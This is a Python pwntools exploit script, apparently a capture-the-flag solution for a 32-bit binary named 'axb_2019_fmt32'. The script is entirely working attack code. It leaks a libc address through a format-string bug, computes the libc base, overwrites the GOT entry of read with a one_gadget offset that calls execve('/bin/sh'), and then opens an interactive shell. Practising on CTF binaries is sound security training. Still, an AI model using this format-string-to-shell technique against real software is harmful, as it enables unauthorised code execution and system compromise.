from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

elf = ELF('./axb_2019_fmt32')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc-2.23.so')

strlenGOT = elf.got['strlen']
readGOT = elf.got['read']

'''
0x3ac6c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac6e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac72 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac79 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbd6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''
one_gadget_list = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]

io = process('./axb_2019_fmt32')


payload = b'%151$p'
io.sendafter('Please tell me:',payload)
io.recvuntil('Repeater:')
addr =  eval(io.recv(10))-247# +247
log.info(hex(addr))



libc_base = addr - libc.sym['__libc_start_main']
one_gadget = libc_base + one_gadget_list[1]
payload = b'a' + fmtstr_payload(8,{readGOT:one_gadget},numbwritten=10)

gdb.attach(io)
io.sendline(payload)

io.interactive()

